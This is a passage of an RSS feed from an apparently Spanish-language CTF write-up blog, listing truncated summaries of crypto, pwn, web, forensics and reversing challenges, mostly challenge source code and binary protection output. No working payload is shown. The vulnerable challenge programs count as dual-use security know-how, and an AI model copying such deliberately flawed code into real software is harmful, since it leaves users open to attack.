from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes, inverse, GCD from secret import FLAG, KEY WELCOME = """ ************** Welcome to the Gringatts Bank. ************** * * * Fortius Quo Fidelius * * * ************************************************************ """ class RSA(): def __init__(self, key_length): self.e = 0x10001 phi = 0 prime_length = key_length // 2 while GCD(self.e, phi) != 1: self.p, self.q = getPrime(prime_length), getPrime(prime_length) phi = (self.</description></item><item><title>Base 2 2 the 6</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/base-2-2-the-6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/base-2-2-the-6/</guid><description>Nos dan este texto:
Q1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K
Como está compuesto por números y letras en mayúsculas y minúsculas, parece que está codificado en Base64.
De hechom el nombre del reto es &amp;ldquo;2 2 the 6&amp;rdquo; (&amp;quot;2 to the 6&amp;quot;), por lo que $2^6 = 64$.
Podemos decodificarlo en una consola de comandos:
$ echo Q1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K | base64 -d CTFlearn{FlaggyWaggyRaggy}</description></item><item><title>base64</title><link>https://7rocky.github.io/ctf/imaginaryctf/base64/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/base64/</guid><description>Se nos proporciona este texto:
aWN0ZntfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX30= Parece que los datos están codificados en Base64&amp;hellip; Y el reto se llama &amp;ldquo;base64&amp;rdquo;, por lo que todo está claro.
Flag Esta es la flag:
$ echo aWN0ZntfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX30= | base64 -d ictf{___________________________________}</description></item><item><title>Bashic Ransomware</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/bashic-ransomware/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/bashic-ransomware/</guid><description>Se nos proporcionan estos archivos:
$ file * flag.txt.a59ap: GPG symmetrically encrypted data (AES256 cipher) forensics.mem: data linux-image-5.10.0-21.zip: Zip archive data, at least v2.0 to extract, compression method=deflate traffic.pcap: pcapng capture file - version 1.0 Podemos deducir que necesitamos analizar una máquina de Linux comprometida porque se nos da un volcado de memoria(forensics.mem) y un perfil para volatility.
Análisis de tráfico de red Comencemos a usar Wireshark para analizar el PCAP:</description></item><item><title>basic</title><link>https://7rocky.github.io/ctf/imaginaryctf/basic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/basic/</guid><description>Se nos pide representar 51 en base 12. Esto es simple:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; def dec_to_base(n: int, b: int) -> int: ... digits = [] ... while n: ... digits.append(n % b) ... n //= b ... return int(''.join(map(str, digits[::-1]))) ... &amp;gt;&amp;gt;&amp;gt; dec_to_base(51, 12) 43 &amp;gt;&amp;gt;&amp;gt; 4 * 12 + 3 51 Y la flag es ictf{43}.</description></item><item><title>basic-file-exploit</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/basic-file-exploit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/basic-file-exploit/</guid><description>Se nos proporciona el código fuente en C de un programa que está en ejecución en remoto:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdbool.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; #include &amp;lt;ctype.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/time.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #define WAIT 60 static const char* flag = "[REDACTED]"; static char data[10][100]; static int input_lengths[10]; static int inputs = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if(l &amp;lt;= 0) { printf("</description></item><item><title>Bat Computer</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/bat-computer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/bat-computer/</guid><description>Se nos proporciona un binario de 64 bits llamado batcomputer:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Ingeniería inversa Si usamod Ghidra, veremos el código descompilado en C para la función main:
int main() { int res; int option; char password[16]; char command[76]; setup(); while(true) { while(true) { memset(password, 0, 16); printf("Welcome to your BatComputer, Batman. What would you like to do?</description></item><item><title>BatchCraft Potions</title><link>https://7rocky.github.io/ctf/htb-challenges/web/batchcraft-potions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/batchcraft-potions/</guid><description>Tenemos este sitio web:
Análisis de código estático Se nos proporciona el código fuente de JavaScript de la aplicación web, creada con Node.js y Express JS. Esto es index.js:
const express = require('express'); const app = express(); const path = require('path'); const cookieParser = require('cookie-parser'); const nunjucks = require('nunjucks'); const routes = require('./routes'); const Database = require('./database'); global.db = new Database(); app.use(express.json()); app.use(cookieParser()); nunjucks.configure('views', { autoescape: true, express: app }); app.</description></item><item><title>BatchCraft Potions</title><link>https://7rocky.github.io/ctf/other/htb-unictf/batchcraft-potions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/batchcraft-potions/</guid><description>Tenemos este sitio web:
Análisis de código estático Se nos proporciona el código fuente de JavaScript de la aplicación web, creada con Node.js y Express JS. Esto es index.js:
const express = require('express'); const app = express(); const path = require('path'); const cookieParser = require('cookie-parser'); const nunjucks = require('nunjucks'); const routes = require('./routes'); const Database = require('./database'); global.db = new Database(); app.use(express.json()); app.use(cookieParser()); nunjucks.configure('views', { autoescape: true, express: app }); app.</description></item><item><title>BBGun06</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/bbgun06/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/bbgun06/</guid><description>Se nos proporciona un código fuente en Python que nos pregunta por una firma. Esta es la función main:
def main(s): rsa = RSA(2048) user, data = parseEmail() signature = rsa.sign(user) rsa.verify(user, signature) headers = generateHeaders(rsa, signature) valid_email = headers + data sendMessage(s, valid_email + "\n\n") try: forged_signature = recieveMessage(s, "Enter the signature as hex: ") forged_signature = bytes.fromhex(forged_signature) if not rsa.verify(user, forged_signature): sendMessage(s, "Invalid signature") if different(rsa, signature, forged_signature): sendMessage(s, FLAG) except: sendMessage(s, "</description></item><item><title>BFD56</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/bfd56/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/bfd56/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from secret import pt,key,block_length import random alph = "ABCDEFGHIKLMNOPQRSTUVWXYZ" def strmask(msg,mask): mask = (mask * ((len(msg)//len(mask)) + 1)) return "".join([alph[(alph.index(i) + alph.index(j)) % 25] for i,j in zip(msg, mask)]) def strunmask(msg,mask): mask = (mask * ((len(msg)//len(mask)) + 1)) return "".join([alph[(alph.index(i) - alph.index(j)) % 25] for i,j in zip(msg, mask)]) def encrypt_block(pt, indices, characters): res = [-1] * len(pt) * 2 for i,c in enumerate(pt): res[i],res[i+len(pt)] = indices[c][0],indices[c][1] ret = "</description></item><item><title>Biased Heritage</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/biased-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/biased-heritage/</guid><description>Este reto es una especie de continuación de Colliding Heritage. Se nos proporciona el código fuente del servidor en Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????????????????}" class SHA256chnorr: def __init__(self): # while True: # self.q = getPrime(512) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x184e26a581fca2893b2096528eb6103ac03f60b023e1284ebda3ab24ad9a9fe0e37b33eeecc4b3c3b9e50832fd856e9889f6c9a10cde54ee798a7c383d0d8d2c3 self.q = (self.p - 1) // 2 self.</description></item><item><title>Biased Heritage</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/biased-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/biased-heritage/</guid><description>Este reto es una especie de continuación de Colliding Heritage. Se nos proporciona el código fuente del servidor en Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????????????????}" class SHA256chnorr: def __init__(self): # while True: # self.q = getPrime(512) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x184e26a581fca2893b2096528eb6103ac03f60b023e1284ebda3ab24ad9a9fe0e37b33eeecc4b3c3b9e50832fd856e9889f6c9a10cde54ee798a7c383d0d8d2c3 self.q = (self.p - 1) // 2 self.</description></item><item><title>Big RSA</title><link>https://7rocky.github.io/ctf/other/teamitaly-ctf/big-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/teamitaly-ctf/big-rsa/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from Crypto.Util.number import getPrime, getStrongPrime, bytes_to_long from sympy import factorial from random import randint from secret import flag p, q = getStrongPrime(1024), getStrongPrime(1024) def RSAgen(e = None): d = 0 if not e: while(d.bit_length() &amp;lt; 2047): e = getPrime(2047) d = pow(e, -1, (p-1)*(q-1)) else: d = pow(e, -1, (p-1)*(q-1)) return (p*q, p, q, e, d) n = p*q print(f'{n = }') key = RSAgen() k = randint(600, 1200) f = factorial(k) leak = (pow(key[3], 2) + (key[3]*key[4] - 1)*f)*getPrime(256) + k # 2048 bit e is very expensive, i should use standard e for my encryption key = RSAgen(65537) e = key[3] flag = bytes_to_long(flag) c = pow(flag, e, n) print(f"</description></item><item><title>BitsNBytes</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/bitsnbytes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/bitsnbytes/</guid><description>Se nos proporcionan dos imágenes PNG intercepted.png y original.png:
$ file intercepted.png intercepted.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced $ file original.png original.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced Ambas imágenes parecen iguales visualmente:
Pero realmente son diferentes porque sus hashes MD5 no coinciden:
$ md5sum intercepted.png 88e9b5b97e4a615f1aa26d11dbcdec0d intercepted.png $ md5sum original.png 04e2562c19e680b6493b2a31d65c51e3 original.png Entonces, podemos deducir que hay algún tipo de esteganografía aplicada en intercepted.</description></item><item><title>Bizz Fuzz</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/bizz-fuzz/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/bizz-fuzz/</guid><description>Se nos proporciona un binario de 32 bits llamado vuln:
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) No tenemos el código fuente del binario, y además está despojado:
$ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=836e2f666bd53c2307bff4801d330e444556a006, stripped Ingeniería inversa Realizar ingeniería inversa sobre el binario será más complicado ya que no tenemos los nombres de las funciones.</description></item><item><title>Blackbox</title><link>https://7rocky.github.io/ctf/ctflearn/binary/blackbox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/binary/blackbox/</guid><description>Se nos proporciona un servidor al que conectarnos por SSH. Existe un binario llamado blackbox que es SGID:
blackbox@ubuntu-512mb-nyc3-01:~$ ls -l total 16 ---x--s--x 1 root blackbox_pwn 8936 Jan 31 2019 blackbox -r--r----- 1 root blackbox_pwn 33 Oct 9 2017 flag.txt blackbox@ubuntu-512mb-nyc3-01:~$ file blackbox blackbox: setgid executable, regular file, no read permission Como se puede ver, no tenemos permisos de lectura, por lo que no podemos transferir el archivo a nuestra máquina, ni descompilarlo, ni depurarlo.</description></item><item><title>Blacksmith</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/blacksmith/</guid><description>Se nos proporciona un binario de 64 bits llamado blacksmith:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Si lo abrimos en Ghidra, veremos esta función main:
void main() { size_t length; long in_FS_OFFSET; int answer; int option; char *message_1; char *message_2; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); message_1 = "You are worthy to carry this Divine Weapon and bring peace to our homeland!</description></item><item><title>Blind</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/blind/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/blind/</guid><description>Is this what people mean by &amp;ldquo;message blinding&amp;rdquo;?
Challenge contributed by CryptoHack
Challenge files:
output.txt blind.sage Análisis del código fuente Se nos proporciona un script largo de SageMath que usa ECDSA para firmar la clave que cifra la flag (en realidad, una clave utilizada para derivar una clave AES con bcrypt.kdf):
def encrypt_flag(): k = secrets.token_bytes(k2//8) key = bcrypt.kdf(k, b"ICC_CHALLENGE", 16, 31337) cipher = AES.new(key, AES.MODE_CTR, nonce=b"") with open("flag.txt", "</description></item><item><title>BlinkerFluids</title><link>https://7rocky.github.io/ctf/htb-challenges/web/blinkerfluids/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/blinkerfluids/</guid><description>Tenemos una página web donde podemos escribir en Markdown y transformar el documento a PDF:
Por defecto, tenemos este contenido en Markdown:
Como tenemos un proyecto en Node.js, si leemos el archivo package.json veremos las versiones de las dependencias de terceros:
{ "name": "blinker-fluids", "version": "1.0.0", "description": "", "main": "index.js", "scripts": { "start": "node index.js" }, "keywords": [], "author": "rayhan0x01", "license": "ISC", "dependencies": { "express": "4.17.3", "md-to-pdf": "4.1.0", "nunjucks": "3.2.3", "</description></item><item><title>bloat.py</title><link>https://7rocky.github.io/ctf/picoctf/reverse-engineering/bloat.py/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/reverse-engineering/bloat.py/</guid><description>Se nos proporciona un script de Python llamado bloat.flag.py:
import sys a = "!\"#$%&amp;amp;'()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"+ \ "[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ " def arg133(arg432): if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]: return True else: print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\ a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\ a[81]+a[68]+a[66]+a[83]) sys.exit(0) return·False def arg111(arg444): return arg122(arg444.decode(), a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\ a[75]+a[72]+a[78]+a[77]) def arg232(): return input(a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\ a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\ a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\ a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94]) def arg132(): return open('flag.txt.enc', 'rb').read() def arg112(): print(a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\ a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\ a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25]) def arg122(arg432, arg423): arg433 = arg423 i = 0 while len(arg433) &amp;lt; len(arg432): arg433 = arg433 + arg423[i] i = (i + 1) % len(arg423) return "</description></item><item><title>Bon-nie-appetit</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/bon-nie-appetit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/bon-nie-appetit/</guid><description>Se nos proporciona un binario de 64 bits llamado bon-nie-appetit:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./' Además, también tenemos el binario parcheado con la librería y cargador de Glibc remoto:
$ ldd bon-nie-appetit linux-vdso.so.1 (0x00007fff11ae1000) libc.so.6 =&amp;gt; ./glibc/libc.so.6 (0x00007f96fdaab000) ./glibc/ld-linux-x86-64.so.2 =&amp;gt; /lib64/ld-linux-x86-64.so.2 (0x00007f96fe0a1000) $ ./glibc/ld-linux-x86-64.so.2 ./glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.5) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc.</description></item><item><title>Box</title><link>https://7rocky.github.io/ctf/imaginaryctf/box/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/box/</guid><description>Se nos proporciona el siguiente código en Python que cifra la flag:
from Crypto.Util.number import bytes_to_long flag = open("flag.txt", "rb").read().strip() TABLE = [ lambda a, b: f"({a}+{b})", lambda a, b: f"({a}-{b})", lambda a, b: f"({a}*{b})", ] def build_box(s: bytes): e = "(x)" for b in s: e = TABLE[b % len(TABLE)](e, b) return eval(f"lambda x: {e}") box = build_box(flag) ct = box(bytes_to_long(flag)) print(ct) print(box(1337)) print(box(0x1337)) """ Output: 5545457088879574964209613711409478327714366805681091501255101702161458272094830554232779120250 3011454617406654839679120250 10002638090931457241529120250 "</description></item><item><title>Brainy's Cipher</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/brainys-cipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/brainys-cipher/</guid><description>Se nos proporciona el siguiente archivo de texto (brainy.txt):
++++++++++[>+>+++>+++++++>++++++++++&lt;&lt;&lt;&lt;-]>>>>+++++++++++++++++++++++.-----------.&lt;------------.---.++.---------.+.++.-.++.+.-----.++..++++.--.++++.+..-------.+.+++.---.+.+++++.-------.+.---.+++++++.+.-------..+++.-.+++++.-------.++.+++++.-----.+++++..-----.--.++++++++.-------.--.++++.+++.---.++..+++.------.+++.--.-..++++++.-.----..+++++.------.++++++.---.---.--.+++.++++.-------.+++++..-.++..-------.++++++.---.++..+++.----.++++.-------.++++++++..----.+++.+.------.--.-.++.-.+++++.--..--.++++.-.++++.---.------.+++++.++.+.---.+++.---.----.++++.--.+++.-----.+++++.+.---.--.+++++++.---.---...---.+.++++++++.----.++++.-----.++.--.-.--.++.-.-.+++++.--..+++++.-------.-.++++.++.-----.++++++.--------.+++.+++.-.+++.----.----.++++++.----.++++++.-------.-----.>+.&lt;++++++++++++++.---------.+.++++++.--------.++.+++++++.--------.+++++++.----.+.----.+++...----.++++..++.----..+++.+++.-----.++++.--.++..-------.+++.++++.--.---.--.++++++..-----..+++++++.-------.+++++++.--------..++++++.++.--..++.----.+++.++.------.++++.+.-..+.+.-------.++++++.-.---.---.-.++++++++..-----.---.++.+.++..-.--.+++.++++.--..------.++++++++.-------.+++++++..---.+.++..---.----.+.++++++..-.-.-----.--.++++.--.+++++++.----.++++.-----.-.+.++.+..+..--.-.---.+++++.--.--.++++++.--------.++.---.+++++++..----.---.+++++++++.-...-------.++++++++.-------.++.-.+++++.----.-.+++++.---.----.+++++.++.-----.---.+++++++.++.---------...++.+++++++.------.+++++.-------.++++.-----.+++++.----.-----.>-------------.++++++++++++.&lt;++++++++++++++.-----..-.----.++++++.-..-----.++.++++++.--.----..--.++.-.++++++++.------.+..--.+++++++.------.---.++++++.----.++++++.-.++.------.++++...--.---.+++++++.--------.++++++++.----..+.----.+..---.++++++++.+.---.-.---.--.++++++++.-----.+++++.----.+.+++.------.--..+++++++++.-.---.++.----.++++.-.------.+++++.--.++.+++.-----.++.++.--..----.-.+++++++.+.----.---.+++++.+++.---.-----.+++++.------.++++++.-.----..++.+++.--.---.++.++++++.--------..+++++.+++.---.-----.++.++++++.---.+++.-.-------.++.+++.-.---.+++.---.+.++.-----.+++++++.---.--.-..++++.++.-------.++++.+.--.++++..+.+.-.---.-.--.+.+++++.--.+++.------..--.++++++++.-.------.++++.+++.-----.+.----.-----.>------------.+++++++++++++.&lt;++++++++++++++.-.---------.++++++..++.+.--.----.-.--.+++.---.++++++++..-----.+.--.--.++++++.+++.----.---.+.++.++++.------.++++++..--.----.++++..---.+++.----.--..++++++++.-.-----..---.+++++++++.---------.++++++.----.+++++.-.--.---.++++++.+.+.---------.++++++.----.++++.+++.-----.+++.--.+++.----.+++.------.++++++.----.++++++.---..------.+++++++.----.++.+.+.++.-..-------.++++++.-------.++++.---.++++.+++.-----.++++++..----.-.+++++..---.---.-..+.--.+++.---.++++.++.---.-.+++++.-..-------.++..+++.++++.----.---.++.+++++.--------.++++.+.------..+++++.---.++++++.-.------.+++.++.--.---.++.+++.-----.+++++.---.+.--.-.+++++++.+.-------.--.+++++.-----..+++++.++.---.+++++.-.--.-.----.-----.>--------------.&lt;++++++++++++++.----.----.--.+++++++.+.--------.++++++++.--..+..---.---.+++++..++.--.++.--.+.------.+++++++.-----.+++++.---.++.++.----.++.----.++.-----.+++..+++++.-----.--.+++...++.----.++++++.--------.+++++++++.--------.+.++++.+.----..++++++.-------.++..++++.--------.++++++.-.-----.++.++++.++.---.-----.++.-.+.++++.++.---.--.-.++++.-..----..+++++++.-----.++++++.---.----.--.+++++.+.--.+++++.----.++++.---.--.+.++.++.--.+.------.+.-.+++.--.---.++.--.++++++++.------.--.+++++.-.-.++++++.------.++++++.------..+++.++.------..++++.-.++..-----.++++++.--------.++.+++++.--.-----.++++++++..-.-----.+++++++.------.+++.------.++.++.-.-.+++.----.+.+++++++.---.+.++..-----.++++.--------.+++++..-.+++++..---.-.-----.++.--.+++++++++.--------.+++++.+++.----.--.+++.--..++.---.++.++++.---.-.++++.--------.+++++..------.+++++++.++.-------.+++.--..++.+.---.++++++.---------.++.+++++.--.++.++.--------.+++++++.-.---.-.++.----.+++++++.--------.++++++.------.+++++++.---.+++.--.++++.---.---..-..++.++.-.-.---.++++++..--.+++.+.----.++++.---------..++.+.+++++.---.-.+.----.+++++++.--.---.--.+..-.-.++++++.--.++++.-.+.-----.+.+++.+.----.++.++..--------.++.+++++++.--------.+++++.+..-----.--.+.++++++.--.----.+.++++++.--------.++++++++.------.--.++++++...+.-------.+++++++++.-----.+.+.----.+++.-----.++++++.+.+.--------.+++.+++++.-------.+.+++++++.--.-------.++++++++.-.------.>++++++++++++++++++++++++++. Se trata de un lenguaje esotérico llamado Brainfuck. Si usamos una herramienta como www.tutorialspoint.com, podemos obtener el resultado:
En resumen, tenemos:
p = 7901324502264899236349230781143813838831920474669364339844939631481665770635584819958931021644265960578585153616742963330195946431321644921572803658406281 q = 12802918451444044622583757703752066118180068668479378778928741088302355425977192996799623998720429594346778865275391307730988819243843851683079000293815051 dp = 5540655028622021934429306287937775291955623308965208384582009857376053583575510784169616065113641391169613969813652523507421157045377898542386933198269451 dq = 9066897320308834206952359399737747311983309062764178906269475847173966073567988170415839954996322314157438770225952491560052871464136163421892050057498651 c = 62078086677416686867183857957350338314446280912673392448065026850212685326551183962056495964579782325302082054393933682265772802750887293602432512967994805549965020916953644635965916607925335639027579187435180607475963322465417758959002385451863122106487834784688029167720175128082066670945625067803812970871 $p$ y $q$ parecen parámetros para un criptosistema RSA, y $c$ debe ser el texto cifrado. Sin embargo, necesitamos saber qué son $dp$ y $dq$.</description></item><item><title>BruXOR</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/bruxor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/bruxor/</guid><description>Se nos proporcionan estos caracteres:
TCQ{rveyln'bH_varHuebcrqxetrHOXEj Nos dicen que se ha utilizado un cifrado XOR, pero necesitamos descubrir la clave. Para esto, podemos realizar un ataque de fuerza bruta utilizando el módulo &amp;ldquo;XOR Brute Force&amp;rdquo; de CyberChef. Si filtramos por CTFlearn, obtenemos la clave y la flag:
Flag: CTFlearn{y0u_Have_bruteforce_XOR}.</description></item><item><title>Buscar</title><link>https://7rocky.github.io/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/search/</guid><description>BuscarBusca por palabras clave en soluciones de CTF y HTB &amp;lt;- INICIO Total: 0</description></item><item><title>Cache Me Outside</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/cache-me-outside/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/cache-me-outside/</guid><description>Se nos proporciona un binario de 64 bits llamado heapedit y un archivo libc.so.6 como librería externa:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' Si ejecutamos el binario obtendremos una violación de segmento (segmentation fault):
$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit Está configurado para utilizar Glibc desde el directorio actual:
$ ldd heapedit linux-vdso.so.1 (0x00007ffe8397e000) libc.</description></item><item><title>Calibrator</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/calibrator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/calibrator/</guid><description>Se nos proporciona una instancia remota a la que conectarnos:
$ nc 165.227.224.40 31139 [OK] Memory check [OK] Syncing filesystem [OK] Detecting sensors [OK] Module loader [OK] Reading configurations Inititing calibration process ... ┌──────────────────────────────────────────────────────────────────────┐ │┼───────────────────┼────────────────────────┼┼──────────────────────┼│ ││ XenoCal 2000 │ . ││ ││ │┼───────────────────┤ ┌─┐ x││ . . ││ ││ Iteration: 42 │ x ► └─┘ ││ x ││ │┼─────────┬─────────┤ ││ ││ ││ X:1337 │ Y:65189 │ . x ┌───┼┼───┐ ││ │┼─────────┴─────────┘ x ┌─┘ ││ └─┐ x ││ ││ .</description></item><item><title>CandyVault</title><link>https://7rocky.github.io/ctf/htb-challenges/web/candyvault/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/candyvault/</guid><description>Se nos proporciona el siguiente sitio web:
También disponemos del código fuente de Python del servidor (Flask).
Análisis del código fuente El archivo relevante es app.py:
from flask import Flask, Blueprint, render_template, redirect, jsonify, request from flask_bcrypt import Bcrypt from pymongo import MongoClient app = Flask(__name__) app.config.from_object("application.config.Config") bcrypt = Bcrypt(app) client = MongoClient(app.config["MONGO_URI"]) db = client[app.config["DB_NAME"]] users_collection = db["users"] @app.errorhandler(Exception) def handle_error(error): message = error.description if hasattr(error, "description") else [str(x) for x in error.</description></item><item><title>Careless Padding</title><link>https://7rocky.github.io/ctf/other/hitcon-ctf/careless-padding/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hitcon-ctf/careless-padding/</guid><description>Se nos proporciona el código fuente del servidor en Python:
#!/usr/local/bin/python import random import os from secret import flag from Crypto.Cipher import AES from Crypto.Random import get_random_bytes import json N = 16 # 0 -&amp;gt; 0, 1~N -&amp;gt; 1, (N+1)~(2N) -&amp;gt; 2 ... def count_blocks(length): block_count = (length-1) // N + 1 return block_count def find_repeat_tail(message): Y = message[-1] message_len = len(message) for i in range(len(message)-1, -1, -1): if message[i] !</description></item><item><title>Chainsmoker</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/chainsmoker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/chainsmoker/</guid><description>Se nos proporciona un script en Python llamado cli.py que interactúa con la instancia remota. Además, tenemos código fuente en Python relacionado con Blockchain que está en ejecución en el servidor.
Otro archivo es bot_wallet.txt, que contiene una billetera de Blockchain:
